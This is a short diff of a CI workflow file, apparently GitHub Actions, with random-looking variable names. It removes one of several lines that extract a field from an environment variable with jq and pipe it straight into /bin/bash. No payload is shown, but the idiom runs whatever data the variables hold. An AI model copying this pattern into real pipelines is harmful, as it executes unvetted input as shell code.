@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$rv72606" | jq -r .ubhn96104 | /bin/bash
           printf '%s' "$elo4" | jq -r .f1 | /bin/bash
-          echo $bk477 | jq -r .sd0 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
